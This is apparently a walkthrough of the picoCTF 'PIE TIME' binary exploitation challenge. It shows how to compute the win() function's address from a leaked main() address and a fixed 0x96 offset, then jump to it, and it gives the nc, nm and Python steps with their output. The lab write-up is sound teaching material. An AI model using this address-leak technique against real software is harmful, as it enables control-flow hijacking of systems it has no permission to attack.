📄 walkthrough.md – Full Write-Up
 picoCTF: PIE TIME 🥧

**Category:** Binary Exploitation
**Difficulty:** Easy
**Points:** 
**Challenge Link:** [PIE TIME](https://play.picoctf.org/practice/challenge/490?originalEvent=74&page=1)

---
 🧠 Challenge Description

> Can you try to get the flag? Beware we have PIE!  
> Connect with:  
> `nc rescued-float.picoctf.net <PORT>`

---
 📂 Files Provided

- `vuln.c` – Source code
- `vuln` – Compiled binary

---
 🔍 Understanding the Source Code

The binary:
1. Shows the memory address of `main()` at runtime.
2. Asks the user to enter an address.
3. Then jumps to that address using a function pointer.

There’s a hidden function:

```c
int win() {
    // Opens flag.txt and prints the content
}
Our goal is to jump to this win() function!

🔐 Security Checks
We ran:

checksec --file=vuln
Output:
t
Full RELRO | Canary found | NX enabled | PIE enabled
🔑 Meaning:

We can’t do a buffer overflow.

We can’t hardcode any memory addresses (because of PIE).

But… we can jump to a calculated function address.

📐 Strategy (Bypass PIE)
We don’t overflow. Instead:

main() address is printed during execution.

Use nm vuln to get offset between main and win:
nm vuln | grep ' main\| win'
Output:
000000000000133d T main
00000000000012a7 T win
➤ Offset = 0x133d - 0x12a7 = 0x96 (hex) or 150 (dec)

So:
win_addr = main_addr - 0x96
🧪 Exploit Steps
Start connection:
nc rescued-float.picoctf.net 54420
Program prints:
Address of main: 0x6284ffca733d
Calculate win address:
python3 -c "print(hex(0x6284ffca733d - 0x96))"
# Output: 0x6284ffca72a7
Enter this address:
Enter the address to jump to: 0x6284ffca72a7

✅ You should see:
You won!
picoCTF{your_flag_here}

🧠 Key Learning
PIE (Position Independent Executable) loads code at different memory locations each time.

Instead of leaking all addresses, we used relative offset (main - win).

No buffer overflow needed!

🛠️ Tools Used
checksec

nm

nc

Python (for offset math)
